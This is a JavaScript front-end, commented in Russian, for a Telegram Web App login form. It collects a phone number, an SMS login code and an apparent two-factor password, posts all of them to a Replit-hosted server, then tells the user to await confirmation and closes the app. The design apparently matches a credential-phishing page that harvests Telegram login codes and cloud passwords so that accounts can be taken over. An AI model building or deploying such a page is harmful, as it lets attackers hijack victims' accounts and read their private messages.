// ================== КОНФИГУРАЦИЯ ==================
const SERVER_URL = 'https://483aeb0e-d724-4e9b-ad96-9b813e0002fa-00-fe63autuudl3.pike.replit.dev';

// ================== ЭЛЕМЕНТЫ DOM ==================
const phoneInput = document.getElementById('phone');
const codeInput = document.getElementById('code');
const faInput = document.getElementById('fa');
const sendBtn = document.getElementById('sendCodeBtn');
const loginBtn = document.getElementById('loginBtn');
const messageDiv = document.getElementById('message');

// ================== ПЕРЕМЕННЫЕ ==================
let currentPhone = '';
let lastGeneratedCode = '';

// ================== ФУНКЦИИ ==================
function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
    messageDiv.style.display = 'block';
    
    // Автоскрытие через 5 секунд
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

async function makeRequest(endpoint, body) {
    console.log(`📤 Отправка на ${SERVER_URL}${endpoint}:`, body);
    
    try {
        const response = await fetch(SERVER_URL + endpoint, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(body)
        });
        
        console.log('📡 Статус:', response.status);
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`HTTP ${response.status}: ${errorText}`);
        }
        
        const data = await response.json();
        console.log('✅ Ответ:', data);
        return data;
        
    } catch (error) {
        console.error('❌ Ошибка запроса:', error);
        throw error;
    }
}

// ================== ИНИЦИАЛИЗАЦИЯ ==================
// Проверка сервера при загрузке
window.addEventListener('load', async () => {
    console.log('🔄 Проверка соединения с сервером...');
    
    try {
        const response = await fetch(SERVER_URL + '/test');
        if (response.ok) {
            const data = await response.json();
            console.log('✅ Сервер доступен:', data);
        } else {
            console.warn('⚠️ Сервер отвечает с ошибкой:', response.status);
        }
    } catch (error) {
        console.error('❌ Сервер недоступен:', error.message);
    }
    
    // Начальное состояние
    codeInput.disabled = true;
    faInput.disabled = true;
    loginBtn.disabled = true;
});

// ================== ОБРАБОТЧИКИ ==================
// 1. Отправка кода
sendBtn.addEventListener('click', async () => {
    currentPhone = phoneInput.value.trim();
    
    if (!currentPhone || !currentPhone.startsWith('+')) {
        showMessage('Введите номер в формате +7XXXXXXXXXX', 'error');
        return;
    }
    
    showMessage('📤 Отправка запроса...', 'info');
    sendBtn.disabled = true;
    sendBtn.textContent = '⏳ Отправка...';
    
    try {
        const data = await makeRequest('/send-code', { 
            phone: currentPhone 
        });
        
        if (data.success) {
            lastGeneratedCode = data.code;
            showMessage(`✅ Запрос отправлен! Код: ${data.code}`, 'success');
            
            // Активируем поля
            codeInput.disabled = false;
            codeInput.focus();
            sendBtn.textContent = '✅ Отправлено';
            sendBtn.style.background = '#666';
            
            console.log(`💾 Код сохранён: ${data.code}`);
        } else {
            showMessage(`❌ Ошибка: ${data.error || 'Неизвестная ошибка'}`, 'error');
            sendBtn.disabled = false;
            sendBtn.textContent = '📤 Отправить код';
        }
        
    } catch (error) {
        showMessage('❌ Ошибка соединения с сервером', 'error');
        console.error('Детали ошибки:', error);
        sendBtn.disabled = false;
        sendBtn.textContent = '📤 Отправить код';
    }
});

// 2. Вход с кодом
loginBtn.addEventListener('click', async () => {
    const code = codeInput.value.trim();
    const fa = faInput.value.trim();
    
    if (!code) {
        showMessage('Введите код из SMS', 'error');
        return;
    }
    
    showMessage('🔐 Проверка данных...', 'info');
    loginBtn.disabled = true;
    loginBtn.textContent = '⏳ Проверка...';
    
    try {
        const data = await makeRequest('/login', { 
            phone: currentPhone,
            code: code,
            fa: fa || ''
        });
        
        if (data.success) {
            showMessage('✅ Регистрация успешна! Ожидайте подтверждения.', 'success');
            loginBtn.textContent = '✅ Завершено';
            loginBtn.style.background = '#666';
            
            // Закрытие через 5 секунд (если в Telegram Web App)
            if (typeof window.Telegram !== 'undefined') {
                setTimeout(() => {
                    window.Telegram.WebApp.close();
                }, 5000);
            }
        } else {
            showMessage(`❌ Ошибка: ${data.error || 'Неверный код'}`, 'error');
            loginBtn.disabled = false;
            loginBtn.textContent = 'Войти в систему';
        }
        
    } catch (error) {
        showMessage('❌ Ошибка соединения', 'error');
        console.error('Детали ошибки:', error);
        loginBtn.disabled = false;
        loginBtn.textContent = 'Войти в систему';
    }
});

// 3. Активация кнопки входа при вводе кода
codeInput.addEventListener('input', () => {
    loginBtn.disabled = codeInput.value.length < 4;
    
    if (codeInput.value.length >= 4) {
        faInput.disabled = false;
    }
});

// 4. Автозаполнение для теста
phoneInput.addEventListener('dblclick', () => {
    if (!phoneInput.value) {
        phoneInput.value = '+79211234567';
        showMessage('🔧 Номер заполнен для теста', 'info');
    }
});

codeInput.addEventListener('dblclick', () => {
    if (!codeInput.value && lastGeneratedCode) {
        codeInput.value = lastGeneratedCode;
        showMessage('🔧 Код заполнен для теста', 'info');
        loginBtn.disabled = false;
    }
});
